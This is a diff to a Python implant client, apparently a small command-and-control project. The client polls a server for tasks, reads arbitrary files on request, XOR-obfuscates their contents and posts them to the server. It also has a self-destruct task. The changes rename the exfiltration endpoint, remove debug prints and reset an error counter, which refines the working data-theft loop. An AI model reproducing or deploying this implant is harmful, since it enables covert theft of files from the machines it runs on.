@@ -31,24 +31,22 @@ while alive:
     try:
         res = requests.post(f"{SERVER}/get_task", json={"uuid": UUID})
         task = res.json()
-        print(task)
+        num_errors = 0
         if task["task"] == "get_file":
-            print("Trying task")
-            print(task["parameters"]["path"])
             path = task["parameters"]["path"]
             try:
                 with open(path, "r") as f:
                     contents = f.read()
                 payload = {"data": contents}
                 payload = obfuscate_payload(payload, xor_key)
-                requests.post(f"{SERVER}/submit_data", json=payload)
+                requests.post(f"{SERVER}/send_data", json=payload)
             except Exception as e:
                 print(f"Error reading file: {e}")
         elif task["task"] == 'destroy':
             destroy()
             alive = False # simulates os.remove(file)
         elif task["task"] == "none":
-            print("[-] No task. Sleeping.")
+            print("No task, Sleeping")
     except Exception as e:
         num_errors += 1
         print(f"Error {num_errors} Reaching Server:")
